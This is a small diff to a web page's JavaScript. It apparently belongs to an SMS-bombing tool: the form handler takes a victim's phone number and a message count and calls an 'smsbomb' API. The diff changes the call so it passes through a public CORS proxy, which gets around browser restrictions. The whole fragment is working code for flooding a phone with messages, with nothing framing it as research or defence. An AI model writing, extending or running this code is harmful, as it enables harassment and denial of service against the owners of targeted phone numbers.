@@ -253,9 +253,11 @@ document.getElementById("apiForm").addEventListener("submit", async (e) => {
   clearConsole();
   log("Preparing payload...", "info");
 
-  const baseUrl = "https://sms-tanginamoka-api-ryujin.vercel.app/api/smsbomb";
-  const apiUrl = baseUrl + "?number=" + encodeURIComponent(number) + "&amount=" + encodeURIComponent(amount);
-
+  const proxyUrl = "https://cors-anywhere.herokuapp.com/";
+const apiUrl = proxyUrl + "https://sms-tanginamoka-api-ryujin.vercel.app/api/smsbomb" +
+                 "?number=" + encodeURIComponent(number) +
+                 "&amount=" + encodeURIComponent(amount);
+  
   setTimeout(async () => {
     log("Sending request to server...", "info");
     try {
